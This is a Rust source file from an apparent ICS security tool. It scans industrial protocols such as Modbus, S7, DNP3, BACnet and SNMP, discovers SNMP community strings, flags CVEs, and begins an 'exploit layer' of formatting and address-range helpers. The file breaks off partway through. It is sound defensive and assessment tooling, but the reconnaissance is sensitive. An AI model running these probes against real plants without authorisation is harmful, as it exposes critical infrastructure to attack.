use std::time::Duration;

use crate::model::{Level, Message, Outcome};
use crate::protocol::Protocol;

pub mod bacnet;
pub mod beckhoff;
pub mod dnp3;
pub mod enip;
pub mod ewon;
pub mod iec104;
pub mod mitsubishi;
pub mod modbus;
pub mod mqtt;
pub mod omron;
pub mod opcua;
pub mod phoenix;
pub mod rockwell;
pub mod schneider;
pub mod siemens;
pub mod snmp;

// ---------------------------------------------------------------------------
// Typed entry points. A surface calls these and renders the result. Nothing
// here prints, and nothing here returns a JSON blob whose keys each caller has
// to re-derive.
// ---------------------------------------------------------------------------

/// Scan one endpoint and return typed records instead of printing them.
///
/// Protocols are migrated one at a time: Modbus is native, everything else still
/// runs through the legacy reporting path below and comes back as messages with
/// `records` empty. Phase 3 moves the surfaces onto this function; phase 2 empties
/// the second arm protocol by protocol.
#[must_use]
// Phase 3 wires the surfaces to this; remove the attribute then.
#[allow(dead_code)]
pub fn scan_ip(protocol: Protocol, ip: &str, port: u16, timeout: u64) -> Outcome {
    // Safe mode gates every probe, whichever surface asked for it.
    if let Err(text) = crate::safety::pre_scan(protocol, ip) {
        return Outcome {
            records: Vec::new(),
            messages: vec![Message {
                level: Level::Error,
                text,
            }],
        };
    }
    // Every variant is listed. A new protocol fails the build here instead of silently
    // falling through to the legacy reporting path, which is how the old code drifted.
    match protocol {
        Protocol::Bacnet => bacnet::scan_ip(ip, port, timeout),
        Protocol::Beckhoff => beckhoff::scan_ip(ip, port, timeout),
        Protocol::Dnp3 => dnp3::scan_ip(ip, port, timeout),
        Protocol::Enip => enip::scan_ip(ip, port, timeout),
        Protocol::Ewon => ewon::scan_ip(ip, port, timeout),
        Protocol::Iec104 => iec104::scan_ip(ip, port, timeout),
        Protocol::Mitsubishi => mitsubishi::scan_ip(ip, port, timeout),
        Protocol::Modbus => modbus::scan_ip(ip, port, timeout),
        Protocol::Mqtt => mqtt::scan_ip(ip, port, timeout),
        Protocol::Omron => omron::scan_ip(ip, port, timeout),
        Protocol::OpcUa => opcua::scan_ip(ip, port, timeout),
        Protocol::Phoenix => phoenix::scan_ip(ip, port, timeout),
        Protocol::Rockwell => rockwell::scan_ip(ip, port, timeout),
        Protocol::Schneider => schneider::scan_ip(ip, port, timeout),
        Protocol::Siemens => siemens::scan_ip(ip, port, timeout),
        Protocol::Snmp => snmp::scan_ip(ip, port, timeout),
    }
}

/// Wrap the reporting path so callers get an `Outcome` even for a protocol that has
/// not been migrated yet. The `[+]`/`[!]`/`[-]` prefixes are decoded here, once, and
/// never reach a surface.
// Phase 3 wires the surfaces to this; remove the attribute then.
#[allow(dead_code)]
fn legacy_scan(protocol: Protocol, ip: &str, port: u16, timeout: u64) -> Outcome {
    // `Fn`, not `FnMut`, so the collector needs interior mutability. That constraint is
    // exactly why every surface wrote its own collector instead of reusing one.
    let lines = std::cell::RefCell::new(Vec::new());
    let _ = scan_ip_report(protocol, ip, port, timeout, &|line: &str| {
        lines.borrow_mut().push(line.to_string());
    });

    let mut outcome = Outcome::default();
    for line in lines.into_inner() {
        outcome.messages.push(Message {
            level: level_of(&line),
            text: line,
        });
    }
    outcome
}

// Phase 3 wires the surfaces to this; remove the attribute then.
#[allow(dead_code)]
fn level_of(line: &str) -> Level {
    if line.starts_with("[+]") {
        Level::Success
    } else if line.starts_with("[!]") {
        Level::Warn
    } else if line.starts_with("[-]") {
        Level::Error
    } else {
        Level::Info
    }
}

// Output-line prefixes understood by all three surfaces (CLI, TUI, Web).
// CLI: strip prefix → display::print_success/warn/error / println!
// TUI: colour by prefix character
// Web: ignore or include in debug log

/// Probe a single IP for a given protocol and port.
///
/// `out` is called for every human-readable output line. Lines starting with
/// `[+] ` are success, `[!] ` are warnings, `[-] ` are errors; all others
/// are plain data rows.
///
/// Returns a JSON object with device fields on success, `None` when the
/// device did not respond or an error occurred (error already emitted via
/// `out`). Caching and display formatting are the caller's responsibility.
#[allow(clippy::too_many_lines)]
pub fn scan_ip_report(
    protocol: Protocol,
    ip: &str,
    port: u16,
    timeout: u64,
    out: &dyn Fn(&str),
) -> Option<serde_json::Value> {
    match protocol {
        Protocol::Enip => {
            let devs = casket::vendors::enip::scan::scan_ip(ip, timeout, false).ok()?;
            if devs.is_empty() {
                out("[!] No EtherNet/IP response.");
                return None;
            }
            let effective_port = if port == 0 { 44_818 } else { port };
            out(&format!("[+] Found {} EtherNet/IP device(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "rockwell",
                "protocol": "ethernet_ip",
                "port": effective_port,
                "enip_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Ewon => {
            let devs = casket::vendors::ewon::scan::scan_ip(ip, timeout, false).ok()?;
            if devs.is_empty() {
                out("[!] No eWON response.");
                return None;
            }
            // 67 was the old table's value (BOOTP); casket discovers on IPCONF 1507. Keep the
            // legacy arm truthful until phase 3 retires it.
            let effective_port = if port == 0 { 1507 } else { port };
            out(&format!("[+] Found {} eWON response(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "ewon",
                "protocol": "ewon_ipconf",
                "port": effective_port,
                "ipconf_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Schneider => {
            use casket::vendors::schneider::scan::Transport;
            let devs = casket::vendors::schneider::scan::scan_ip_with_transport(
                ip,
                timeout,
                false,
                port,
                Transport::Both,
            )
            .ok()?;
            if devs.is_empty() {
                out("[!] No Schneider response.");
                return None;
            }
            let effective_port = if port == 0 {
                casket::core::modbus::DEFAULT_PORT
            } else {
                port
            };
            out(&format!("[+] Found {} Schneider device(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "schneider",
                "protocol": "modbus_tcp",
                "port": effective_port,
                "modbus_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Mitsubishi => {
            use casket::vendors::mitsubishi::scan::Transport;
            let devs = casket::vendors::mitsubishi::scan::scan_ip_with_transport(
                ip,
                timeout,
                false,
                port,
                Transport::Both,
            )
            .ok()?;
            if devs.is_empty() {
                out("[!] No Mitsubishi MELSEC response.");
                return None;
            }
            let effective_port = if port == 0 {
                casket::vendors::mitsubishi::slmp::DEFAULT_PORT
            } else {
                port
            };
            out(&format!("[+] Found {} Mitsubishi device(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "mitsubishi",
                "protocol": "slmp",
                "port": effective_port,
                "slmp_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Beckhoff => {
            let devs =
                casket::vendors::beckhoff::scan::discover_ip_with_port(ip, timeout, false, port)
                    .ok()?;
            if devs.is_empty() {
                out("[!] No Beckhoff TwinCAT response.");
                return None;
            }
            let effective_port = if port == 0 {
                casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT
            } else {
                port
            };
            out(&format!("[+] Found {} Beckhoff device(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "beckhoff",
                "protocol": "ads",
                "port": effective_port,
                "ads_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Siemens => {
            use casket::vendors::siemens::scan;
            use casket::vendors::snmp::{client as snmp_client, enumerate as snmp_enum};
            let s7_port = if port == 0 { 102 } else { port };
            let dev = scan::scan_ip_with_port(ip, s7_port);
            out(&format!("  IP:       {}", dev.ip));
            if let Some(hw) = &dev.hardware {
                out(&format!("  Hardware: {hw}"));
            }
            if let Some(fw) = &dev.firmware {
                out(&format!("  Firmware: {fw}"));
            }
            if let Some(cs) = &dev.cpu_state {
                out(&format!("  CPU:      {cs}"));
            }
            if !dev.open_ports.is_empty() {
                let ports: Vec<String> = dev.open_ports.iter().map(ToString::to_string).collect();
                out(&format!("  Ports:    {}", ports.join(", ")));
            }
            let community = snmp_client::discover_community(ip, snmp_client::SNMP_PORT);
            if let Some(community) = community {
                if let Ok(info) = snmp_enum::get_system_info(ip, snmp_client::SNMP_PORT, &community)
                {
                    out(&format!("  SNMP community: {community}"));
                    if !info.descr.is_empty() {
                        out(&format!("  sysDescr:  {}", info.descr));
                    }
                    if !info.name.is_empty() {
                        out(&format!("  sysName:   {}", info.name));
                    }
                    if let Some(v) = info.ics_vendor {
                        out(&format!("  ICS vendor (SNMP): {v}"));
                    }
                    for cve in snmp_enum::check_cves(&info) {
                        out(&format!(
                            "[!]   CVE: {} (CVSS {}) — {}",
                            cve.id, cve.cvss, cve.summary
                        ));
                    }
                }
            }
            if dev.open_ports.is_empty() && dev.hardware.is_none() && dev.firmware.is_none() {
                out("[!] No Siemens S7 data retrieved.");
                return None;
            }
            out("[+] Siemens S7 device found.");
            Some(serde_json::json!({
                "vendor": "siemens",
                "protocol": "s7comm",
                "port": s7_port,
                "s7_port": s7_port,
                "hardware": dev.hardware,
                "firmware": dev.firmware,
                "cpu_state": dev.cpu_state,
                "open_ports": dev.open_ports,
            }))
        }

        Protocol::Snmp => {
            use casket::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let found = client::discover_community(ip, snmp_port).and_then(|community| {
                client::get(ip, snmp_port, &community, oids::SYS_DESCR)
                    .ok()
                    .map(|value| (community, value.display()))
            });
            match found {
                None => {
                    out("[!] No SNMP community strings responded.");
                    None
                }
                Some((community, descr)) => {
                    out(&format!("  community={community:<12}  sysDescr={descr}"));
                    out("[+] 1 responding community string found.");
                    Some(serde_json::json!({
                        "vendor": "snmp",
                        "protocol": "snmp",
                        "port": snmp_port,
                        "snmp_port": snmp_port,
                        "community": community,
                        "descr": descr,
                    }))
                }
            }
        }

        Protocol::Mqtt => {
            let mqtt_port = if port == 0 { 1883 } else { port };
            match casket::vendors::mqtt::client::probe(ip, mqtt_port) {
                None => {
                    out("[!] No MQTT broker response.");
                    None
                }
                Some(dev) => {
                    out(&format!("  anonymous={}", dev.anonymous));
                    if let Some(info) = &dev.broker_info {
                        out(&format!("  broker_info={info}"));
                    }
                    out(&format!("  sparkplug={}", dev.sparkplug));
                    out("[+] MQTT broker responded.");
                    Some(serde_json::json!({
                        "vendor": "mqtt",
                        "protocol": "mqtt",
                        "port": mqtt_port,
                        "mqtt_port": mqtt_port,
                        "anonymous": dev.anonymous,
                        "broker_info": dev.broker_info,
                        "sparkplug": dev.sparkplug,
                    }))
                }
            }
        }

        Protocol::Bacnet => {
            use casket::vendors::bacnet::client;
            let bacnet_port = if port == 0 { client::BACNET_PORT } else { port };
            match client::scan_ip_with_port(ip, bacnet_port, timeout) {
                None => {
                    out("[!] No BACnet device responded.");
                    None
                }
                Some(d) => {
                    out(&format!("  Instance:  {}", d.instance_id));
                    out(&format!("  Vendor ID: {}", d.vendor_id));
                    out(&format!("  Name:      {}", d.object_name));
                    if !d.vendor_name.is_empty() {
                        out(&format!("  Vendor:    {}", d.vendor_name));
                    }
                    out("[+] BACnet device responded.");
                    Some(serde_json::json!({
                        "vendor": "bacnet",
                        "protocol": "bacnet_ip",
                        "port": bacnet_port,
                        "bacnet_port": bacnet_port,
                        "instance_id": d.instance_id,
                        "vendor_id": d.vendor_id,
                        "name": d.object_name,
                        "vendor_name": d.vendor_name,
                    }))
                }
            }
        }

        Protocol::Dnp3 => {
            use casket::vendors::dnp3::client;
            let dnp3_port = if port == 0 { 20_000 } else { port };
            match client::detect_with_port(ip, dnp3_port, Duration::from_secs(timeout)) {
                None => {
                    out("[!] No DNP3 outstation responded.");
                    None
                }
                Some(d) => {
                    out(&format!("  Outstation: 0x{:04x}", d.outstation_addr));
                    for (k, v) in &d.device_attributes {
                        out(&format!("  {k}: {v}"));
                    }
                    out("[+] DNP3 outstation responded.");
                    Some(serde_json::json!({
                        "vendor": "dnp3",
                        "protocol": "dnp3",
                        "port": dnp3_port,
                        "dnp3_port": dnp3_port,
                        "outstation": d.outstation_addr,
                        "attributes": d.device_attributes,
                    }))
                }
            }
        }

        Protocol::OpcUa => {
            use casket::vendors::opcua::client;
            let opcua_port = if port == 0 { 4840 } else { port };
            match client::detect(ip, opcua_port, Duration::from_secs(timeout)) {
                None => {
                    out("[!] No OPC-UA server responded.");
                    None
                }
                Some(d) => {
                    out(&format!("  Application: {}", d.application_name));
                    if !d.application_uri.is_empty() {
                        out(&format!("  URI:         {}", d.application_uri));
                    }
                    out(&format!("  Endpoints:   {}", d.endpoints.len()));
                    out("[+] OPC-UA server responded.");
                    Some(serde_json::json!({
                        "vendor": "opcua",
                        "protocol": "opcua",
                        "port": opcua_port,
                        "opcua_port": opcua_port,
                        "application": d.application_name,
                        "uri": d.application_uri,
                        "endpoint_count": d.endpoints.len(),
                    }))
                }
            }
        }

        Protocol::Iec104 => {
            use casket::vendors::iec104::client;
            let iec_port = if port == 0 { client::IEC104_PORT } else { port };
            if client::probe(ip, iec_port) {
                out("[+] IEC 104 outstation responded to TESTFR.");
                Some(serde_json::json!({
                    "vendor": "iec104",
                    "protocol": "iec60870_5_104",
                    "port": iec_port,
                    "iec104_port": iec_port,
                }))
            } else {
                out("[!] No IEC 104 outstation responded.");
                None
            }
        }

        Protocol::Modbus => {
            use casket::vendors::schneider::scan::{self, Transport};
            let devs = match scan::scan_ip_with_transport(ip, timeout, false, port, Transport::Tcp)
            {
                Ok(d) => d,
                Err(e) => {
                    out(&format!("[-] Modbus scan error: {e}"));
                    return None;
                }
            };
            if devs.is_empty() {
                out("[!] No Modbus TCP device responded.");
                return None;
            }
            for d in &devs {
                if let Some(name) = &d.name {
                    out(&format!("  Name:     {name}"));
                }
                if let Some(fw) = &d.firmware {
                    out(&format!("  Firmware: {fw}"));
                }
            }
            let effective_port = if port == 0 {
                casket::core::modbus::DEFAULT_PORT
            } else {
                port
            };
            out(&format!("[+] Found {} Modbus device(s).", devs.len()));
            Some(serde_json::json!({
                "vendor": "modbus",
                "protocol": "modbus_tcp",
                "port": effective_port,
                "modbus_port": effective_port,
                "count": devs.len(),
            }))
        }

        Protocol::Omron => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { fins::FINS_TCP_PORT } else { port };
            match fins::get_device_info_tcp(ip, fins_port) {
                Err(e) => {
                    out(&format!("[-] Omron FINS error: {e}"));
                    None
                }
                Ok(dev) => {
                    out(&format!("  Node:    {}", dev.node_addr));
                    out(&format!("  Model:   {}", dev.model));
                    out(&format!("  Version: {}", dev.version));
                    out("[+] Omron FINS device responded.");
                    Some(serde_json::json!({
                        "vendor": "omron",
                        "protocol": "fins",
                        "port": fins_port,
                        "fins_port": fins_port,
                        "node": dev.node_addr,
                        "model": dev.model,
                        "version": dev.version,
                    }))
                }
            }
        }

        Protocol::Phoenix => {
            use casket::vendors::phoenix::control;
            match control::get_device_info(ip, port, true) {
                Err(e) => {
                    out(&format!("[-] Phoenix Contact error: {e}"));
                    None
                }
                Ok(dev) => {
                    out(&format!("  PLC type: {}", dev.plc_type));
                    if let Some(fw) = &dev.firmware {
                        out(&format!("  Firmware: {fw}"));
                    }
                    if let Some(b) = &dev.build {
                        out(&format!("  Build:    {b}"));
                    }
                    out("[+] Phoenix Contact device responded.");
                    let effective_port = if port == 0 { 1962 } else { port };
                    Some(serde_json::json!({
                        "vendor": "phoenix",
                        "protocol": "proconos",
                        "port": effective_port,
                        "phoenix_info_port": effective_port,
                        "plc_type": dev.plc_type,
                        "firmware": dev.firmware,
                        "build": dev.build,
                    }))
                }
            }
        }

        Protocol::Rockwell => {
            use casket::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44_818 } else { port };
            match driver::get_device_info(ip, enip_port) {
                Err(e) => {
                    out(&format!("[-] Rockwell EtherNet/IP error: {e}"));
                    None
                }
                Ok(dev) => {
                    out(&format!("  Vendor:   {}", dev.vendor));
                    out(&format!("  Product:  {}", dev.product_name));
                    out(&format!("  Type:     {}", dev.product_type));
                    out(&format!("  Revision: {}", dev.revision));
                    out(&format!("  Serial:   {}", dev.serial));
                    out("[+] Rockwell EtherNet/IP device responded.");
                    Some(serde_json::json!({
                        "vendor": "rockwell",
                        "protocol": "ethernet_ip",
                        "port": enip_port,
                        "enip_port": enip_port,
                        "vendor_name": dev.vendor,
                        "product_name": dev.product_name,
                        "product_type": dev.product_type,
                        "revision": dev.revision,
                        "serial": dev.serial,
                    }))
                }
            }
        }
    }
}

/// Broadcast scan for protocols that support it.
///
/// Returns a vec of JSON device records (one per discovered device).
/// Requires a valid interface name. Unsupported protocols emit a warning
/// via `out` and return an empty vec.
pub fn scan_broadcast(
    protocol: Protocol,
    interface_name: &str,
    timeout: u64,
    out: &dyn Fn(&str),
) -> Vec<serde_json::Value> {
    use casket::core::network::get_interfaces;
    let ifaces = get_interfaces();
    let Some(iface) = ifaces.iter().find(|i| i.name == interface_name) else {
        out(&format!("[-] Interface '{interface_name}' not found."));
        return Vec::new();
    };
    match protocol {
        Protocol::Enip => match casket::vendors::enip::scan::scan(iface, timeout, false) {
            Ok(devs) => {
                out(&format!("[+] Found {} EtherNet/IP device(s).", devs.len()));
                devs.iter()
                    .map(|_d| serde_json::json!({"vendor": "rockwell", "protocol": "ethernet_ip"}))
                    .collect()
            }
            Err(e) => {
                out(&format!("[-] EtherNet/IP broadcast error: {e}"));
                Vec::new()
            }
        },
        Protocol::Ewon => match casket::vendors::ewon::scan::scan(iface, timeout, false) {
            Ok(devs) => {
                out(&format!("[+] Found {} eWON response(s).", devs.len()));
                devs.iter()
                    .map(|_d| serde_json::json!({"vendor": "ewon", "protocol": "ewon_ipconf"}))
                    .collect()
            }
            Err(e) => {
                out(&format!("[-] eWON broadcast error: {e}"));
                Vec::new()
            }
        },
        Protocol::Schneider => {
            match casket::vendors::schneider::scan::scan(iface, timeout, false) {
                Ok(devs) => {
                    out(&format!("[+] Found {} Schneider device(s).", devs.len()));
                    devs.iter()
                        .map(|_d| {
                            serde_json::json!({"vendor": "schneider", "protocol": "modbus_tcp"})
                        })
                        .collect()
                }
                Err(e) => {
                    out(&format!("[-] Schneider broadcast error: {e}"));
                    Vec::new()
                }
            }
        }
        Protocol::Mitsubishi => {
            match casket::vendors::mitsubishi::scan::scan(iface, timeout, false) {
                Ok(devs) => {
                    out(&format!("[+] Found {} Mitsubishi device(s).", devs.len()));
                    devs.iter()
                        .map(|_d| serde_json::json!({"vendor": "mitsubishi", "protocol": "slmp"}))
                        .collect()
                }
                Err(e) => {
                    out(&format!("[-] Mitsubishi broadcast error: {e}"));
                    Vec::new()
                }
            }
        }
        Protocol::Beckhoff => {
            match casket::vendors::beckhoff::scan::discover(iface, timeout, false) {
                Ok(devs) => {
                    out(&format!("[+] Found {} Beckhoff device(s).", devs.len()));
                    devs.iter()
                        .map(|_d| serde_json::json!({"vendor": "beckhoff", "protocol": "ads"}))
                        .collect()
                }
                Err(e) => {
                    out(&format!("[-] Beckhoff broadcast error: {e}"));
                    Vec::new()
                }
            }
        }
        p => {
            out(&format!(
                "[!] {p:?} does not support broadcast scan: provide '-i <IP>'"
            ));
            Vec::new()
        }
    }
}

// ─── Shared exploit layer ─────────────────────────────────────────────────────
// All functions below are DB-free and surface-agnostic.

use casket::core::network::{local_ip_for, NetworkInterface};

// ─── Format helpers ───────────────────────────────────────────────────────────

pub fn hex_fmt(b: &[u8]) -> String {
    use std::fmt::Write;
    b.iter().fold(String::new(), |mut s, x| {
        let _ = write!(s, "{x:02x}");
        s
    })
}

pub fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
    data.chunks(16)
        .enumerate()
        .map(|(i, chunk)| {
            let offset = base_offset as usize + i * 16;
            let hex: String = {
                use std::fmt::Write;
                chunk.iter().fold(String::new(), |mut s, b| {
                    let _ = write!(s, "{b:02x} ");
                    s
                })
            };
            let ascii: String = chunk
                .iter()
                .map(|&b| if b.is_ascii_graphic() { b as char } else { '.' })
                .collect();
            format!("  {offset:04x}  {hex:<48}  {ascii}")
        })
        .collect()
}

pub fn io_header() -> [String; 2] {
    [
        format!(
            "  {:<10}  {:<4}  {:<5}  {}",
            "Address", "Bit", "Value", "Raw"
        ),
        format!("  {:─<10}  {:─<4}  {:─<5}  {:─<3}", "", "", "", ""),
    ]
}

pub fn fmt_io_row(addr: &str, bit: &str, val: u8) -> String {
    let value_str = if val != 0 { "true " } else { "false" };
    format!("  {addr:<10}  {bit:<4}  {value_str:<5}  {val}")
}

pub fn modbus_header() -> [String; 2] {
    [
        format!(
            "  {:<10}  {:<8}  {:<10}  {}",
            "Address", "Number", "Value", "Hex"
        ),
        format!("  {:─<10}  {:─<8}  {:─<10}  {:─<6}", "", "", "", ""),
    ]
}

pub fn fmt_modbus_row(r: &casket::vendors::schneider::modbus::ModbusRegister) -> String {
    format!(
        "  {:<10}  {:<8}  {:<10}  {:#06x}",
        r.address, r.display_addr, r.raw, r.raw
    )
}

pub fn slmp_header() -> [String; 2] {
    [
        format!("  {:<12}  {:<10}  {}", "Device", "Address", "Value"),
        format!("  {:─<12}  {:─<10}  {:─<8}", "", "", ""),
    ]
}

pub fn fmt_slmp_row(v: &casket::vendors::mitsubishi::slmp::SlmpValue) -> String {
    format!("  {:<12}  {:<10}  {}", v.display, v.raw, v.value_str)
}

pub fn ads_symbol_header() -> [String; 2] {
    [
        format!(
            "  {:<48}  {:<14}  {:<20}  {}",
            "Name", "Type", "Value", "Size"
        ),
        format!("  {:─<48}  {:─<14}  {:─<20}  {:─<8}", "", "", "", ""),
    ]
}

pub fn fmt_ads_symbol_row(name: &str, type_name: &str, value: &str, size: u32) -> String {
    format!("  {name:<48}  {type_name:<14}  {value:<20}  {size} B")
}

fn tag_access_class(name: &str) -> &'static str {
    if let Some(pos) = name.rfind(':') {
        let suffix = &name[pos + 1..];
        let mut chars = suffix.chars();
        let first = chars.next().unwrap_or('_');
        let rest_digits = chars.all(|c| c.is_ascii_digit());
        if rest_digits {
            match first {
                'I' => return "Input",
                'O' => return "Output",
                'C' => return "Config",
                _ => {}
            }
        }
    }
    "User"
}

fn tag_header() -> [String; 2] {
    [
        format!(
            "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  {:<9}  {}",
            "#", "Name", "Type", "Dims", "Value", "Type Word", "Access"
        ),
        format!(
            "  {:─>6}  {:─<42}  {:─<14}  {:─<4}  {:─<18}  {:─<9}  {:─<6}",
            "", "", "", "", "", "", ""
        ),
    ]
}

fn fmt_tag_row(
    instance_id: i64,
    name: &str,
    base: &str,
    dims: &str,
    value: &str,
    raw: i64,
) -> String {
    let access = tag_access_class(name);
    format!(
        "  {instance_id:>6}  {name:<42}  {base:<14}  {dims:<4}  {value:<18}  0x{raw:04x}  {access:<6}"
    )
}

fn fmt_leaf_row(member_name: &str, value: &str, pad: usize) -> String {
    format!("           {member_name:<pad$}  {value}")
}

// ─── Constants ────────────────────────────────────────────────────────────────

pub const MODBUS_ADDRESS_SPACE: u32 = 65_536;
pub const MODBUS_WORD_CHUNK: u16 = 125;
pub const MODBUS_BIT_CHUNK: u16 = 2000;
pub const MODBUS_MAP_VALUE_OUTPUT_CAP: usize = 64;
pub const MODBUS_MAP_ERROR_OUTPUT_CAP: usize = 20;
pub const SLMP_ADDRESS_SPACE: u32 = 16_777_216;
pub const SLMP_WORD_CHUNK: u16 = 960;
pub const SLMP_BIT_CHUNK: u16 = 3584;

// ─── ModbusTable ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModbusTable {
    Holding,
    Input,
    Coil,
    Discrete,
}

impl ModbusTable {
    pub fn parse(input: &str) -> Option<Self> {
        match input.trim().to_ascii_lowercase().as_str() {
            "hr" | "holding" | "holding-register" | "holding-registers" | "hreg" | "hregs"
            | "register" | "registers" => Some(Self::Holding),
            "ir" | "input" | "input-register" | "input-registers" | "ireg" | "iregs" => {
                Some(Self::Input)
            }
            "co" | "coil" | "coils" => Some(Self::Coil),
            "di" | "discrete" | "discrete-input" | "discrete-inputs" | "input-bit"
            | "input-bits" => Some(Self::Discrete),
            _ => None,
        }
    }

    pub fn short_name(self) -> &'static str {
        match self {
            Self::Holding => "HR",
            Self::Input => "IR",
            Self::Coil => "CO",
            Self::Discrete => "DI",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Holding => "holding registers",
            Self::Input => "input registers",
            Self::Coil => "coils",
            Self::Discrete => "discrete inputs",
        }
    }

    pub fn point_type(self) -> &'static str {
        match self {
            Self::Holding | Self::Input => "UINT16",
            Self::Coil | Self::Discrete => "BOOL",
        }
    }

    pub fn chunk_limit(self) -> u16 {
        match self {
            Self::Holding | Self::Input => MODBUS_WORD_CHUNK,
            Self::Coil | Self::Discrete => MODBUS_BIT_CHUNK,
        }
    }

    pub fn display_addr(self, address: u32) -> u32 {
        let offset = match self {
            Self::Holding => 40001,
            Self::Input => 30001,
            Self::Coil => 1,
            Self::Discrete => 10001,
        };
        address + offset
    }

    pub fn point_key(self, address: u32) -> String {
        format!("{}{}", self.short_name(), self.display_addr(address))
    }
}

// ─── ModbusMapRange ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ModbusMapRange {
    pub table: ModbusTable,
    pub start: u32,
    pub count: u32,
}

impl ModbusMapRange {
    pub fn new(table: ModbusTable, start: u32, count: u32) -> Self {
        Self {
            table,
            start,
            count,
        }
    }

    pub fn display_start(self) -> u32 {
        self.table.display_addr(self.start)
    }

    pub fn display_end(self) -> u32 {
        self.table.display_addr(self.start + self.count - 1)
    }
}

pub fn quick_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, 32),
        ModbusMapRange::new(ModbusTable::Input, 0, 32),
        ModbusMapRange::new(ModbusTable::Coil, 0, 64),
        ModbusMapRange::new(ModbusTable::Discrete, 0, 64),
    ]
}

pub fn common_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, 1000),
        ModbusMapRange::new(ModbusTable::Input, 0, 1000),
        ModbusMapRange::new(ModbusTable::Coil, 0, 2000),
        ModbusMapRange::new(ModbusTable::Discrete, 0, 2000),
    ]
}

pub fn all_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Input, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Coil, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Discrete, 0, MODBUS_ADDRESS_SPACE),
    ]
}

pub fn parse_modbus_map_input(input: &str) -> Result<Vec<ModbusMapRange>, String> {
    let spec = input.trim();
    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
        return Ok(quick_modbus_ranges());
    }
    if spec.eq_ignore_ascii_case("common") {
        return Ok(common_modbus_ranges());
    }
    if spec.eq_ignore_ascii_case("all") {
        return Ok(all_modbus_ranges());
    }
    let mut ranges = Vec::new();
    for token in spec.split(',') {
        let token = token.trim();
        if token.is_empty() {
            return Err(format_modbus_map_usage());
        }
        let parts: Vec<_> = token.split(':').map(str::trim).collect();
        if parts.len() != 3 {
            return Err(format_modbus_map_usage());
        }
        let table = ModbusTable::parse(parts[0]).ok_or_else(|| {
            format!(
                "unknown Modbus table '{}'. {}",
                parts[0],
                format_modbus_map_usage()
            )
        })?;
        let start = parts[1].parse::<u32>().map_err(|_| {
            format!(
                "invalid start address '{}'. {}",
                parts[1],
                format_modbus_map_usage()
            )
        })?;
        let count = parts[2].parse::<u32>().map_err(|_| {
            format!(
                "invalid count '{}'. {}",
                parts[2],
                format_modbus_map_usage()
            )
        })?;
        if start >= MODBUS_ADDRESS_SPACE {
            return Err(format!(
                "start address {start} is outside 0..65535. {}",
                format_modbus_map_usage()
            ));
        }
        if count == 0 || count > MODBUS_ADDRESS_SPACE - start {
            return Err(format!(
                "count {count} at start {start} is outside the Modbus address space. {}",
                format_modbus_map_usage()
            ));
        }
        ranges.push(ModbusMapRange::new(table, start, count));
    }
    if ranges.is_empty() {
        Err(format_modbus_map_usage())
    } else {
        Ok(ranges)
    }
}

pub fn format_modbus_map_usage() -> String {
    "use quick, common, all, or table:start:count entries like hr:0:500,ir:0:100,co:0:128,di:0:128"
        .to_string()
}

pub fn modbus_map_chunks(range: ModbusMapRange) -> Vec<(u16, u16)> {
    let mut chunks = Vec::new();
    let mut start = range.start;
    let mut remaining = range.count;
    let max_count = u32::from(range.table.chunk_limit());
    while remaining > 0 {
        let count = remaining.min(max_count);
        chunks.push((
            u16::try_from(start).unwrap_or(u16::MAX),
            u16::try_from(count).unwrap_or(u16::MAX),
        ));
        start += count;
        remaining -= count;
    }
    chunks
}

// ─── SlmpDeviceKind / SlmpMapRange ────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SlmpDeviceKind {
    Word,
    Bit,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SlmpMapRange {
    pub device: &'static str,
    pub kind: SlmpDeviceKind,
    pub start: u32,
    pub count: u32,
}

impl SlmpMapRange {
    pub fn new(device: &'static str, kind: SlmpDeviceKind, start: u32, count: u32) -> Self {
        Self {
            device,
            kind,
            start,
            count,
        }
    }

    pub fn display_start(self) -> String {
        format!("{}{}", self.device, self.start)
    }

    pub fn display_end(self) -> String {
        format!("{}{}", self.device, self.start + self.count - 1)
    }

    pub fn chunk_limit(self) -> u16 {
        match self.kind {
            SlmpDeviceKind::Word => SLMP_WORD_CHUNK,
            SlmpDeviceKind::Bit => SLMP_BIT_CHUNK,
        }
    }
}

pub fn parse_slmp_device(input: &str) -> Option<(&'static str, SlmpDeviceKind)> {
    match input.trim().to_ascii_lowercase().as_str() {
        "d" | "data" | "data-register" | "data-registers" => Some(("D", SlmpDeviceKind::Word)),
        "w" | "link-register" | "link-registers" => Some(("W", SlmpDeviceKind::Word)),
        "r" | "file-register" | "file-registers" => Some(("R", SlmpDeviceKind::Word)),
        "m" | "marker" | "markers" | "internal-relay" | "internal-relays" => {
            Some(("M", SlmpDeviceKind::Bit))
        }
